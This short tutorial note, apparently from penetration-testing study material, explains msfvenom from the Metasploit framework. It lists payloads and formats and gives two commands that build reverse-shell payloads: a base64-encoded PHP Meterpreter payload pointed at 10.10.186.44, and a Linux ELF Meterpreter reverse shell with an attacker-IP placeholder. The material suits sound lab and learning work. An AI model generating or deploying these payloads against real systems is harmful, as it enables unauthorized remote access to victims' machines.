Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

``` bash
msfvenom -l payloads

#
msfvenom --list formats

# encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64


msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacking ip> LPORT=1234 -f elf > rev_shell.elf
```